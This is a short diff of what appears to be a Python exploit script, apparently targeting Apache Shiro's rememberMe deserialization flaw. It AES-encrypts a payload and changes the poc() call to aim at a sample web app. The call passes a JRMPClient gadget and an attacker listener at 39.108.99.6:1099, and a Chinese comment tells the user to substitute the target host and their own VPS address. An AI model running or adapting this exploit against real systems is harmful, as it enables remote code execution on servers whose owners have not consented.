@@ -45,4 +45,5 @@ def generator(command, fp,aeskey,func):
     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
     return base64_ciphertext
     
-poc('http://124.16.75.162:30003/','39.108.99.6:1099',keys[1],'JRMPClient')   #www.test.com替换成目标主机的链接，114.118.80.138替换成自己VPS的地址
+# poc('http://124.16.75.162:30003/','39.108.99.6:1099',keys[1],'JRMPClient')   #www.test.com替换成目标主机的链接，114.118.80.138替换成自己VPS的地址
+poc('http://192.168.78.148:8080/samples-web-1.2.4/','39.108.99.6:1099',keys[1],'JRMPClient')   #www.test.com替换成目标主机的链接，114.118.80.138替换成自己VPS的地址
